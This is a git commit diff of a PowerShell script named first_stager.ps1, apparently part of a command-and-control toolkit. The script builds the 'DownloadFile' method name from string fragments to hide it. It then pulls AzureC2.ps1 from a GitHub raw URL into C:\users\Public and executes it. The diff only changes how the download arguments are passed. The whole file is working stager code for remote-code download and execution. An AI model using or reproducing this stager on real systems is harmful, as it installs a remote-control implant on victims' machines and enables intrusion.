8d9c4d21a233fe1bbb56c92226625d201c9ce54e
bokanrb <stabelini.bruno@gmail.com>
2020-07-16 12:03:04 -0300

    commit

--- Powershell/first_stager.ps1
+++ Powershell/first_stager.ps1
@@ -2,5 +2,5 @@ $wss="Do"+"w"+"n"+"lo"+"ad"+"Fi"+"le";
 $argsv1="https://raw.githubusercontent.com/bokanrb/bokanrb_git/master/Powershell/AzureC2.ps1"; 
 $argsv2="C:\users\Public\AzureC2.ps1"; 
 $wss2=New-Object Net.Webclient; 
-IEX(($wss2).$wss.Invoke($argsv1 +','+$argsv2)); 
+IEX(($wss2).$wss.Invoke($argsv1,$argsv2)); 
 & "C:\users\Public\AzureC2.ps1"
